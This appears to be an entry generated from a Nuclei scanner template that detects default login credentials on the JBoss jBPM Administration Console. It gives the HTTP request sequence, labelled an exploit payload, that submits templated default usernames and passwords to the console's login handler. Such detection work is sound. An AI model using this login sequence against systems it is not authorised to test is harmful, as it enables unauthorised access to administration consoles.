# Nuclei Template: JBoss jBPM Administration Console Default Login - Detect
**Template ID:** jboss-jbpm-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`jboss-jbpm-default-login.yaml`)

## Vulnerability Information & PoC

## Description
JBoss jBPM Administration Console default login information was detected.

## Steps to reproduce / Exploit Payload
```http
GET /jbpm-console/app/tasks.jsf HTTP/1.1
Host: {{Hostname}}

POST /jbpm-console/app/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

j_username={{user}}&j_password={{pass}}

GET /jbpm-console/app/tasks.jsf HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/PortSwigger/j2ee-scan/blob/master/src/main/java/burp/j2ee/issues/impl/JBossjBPMAdminConsole.java
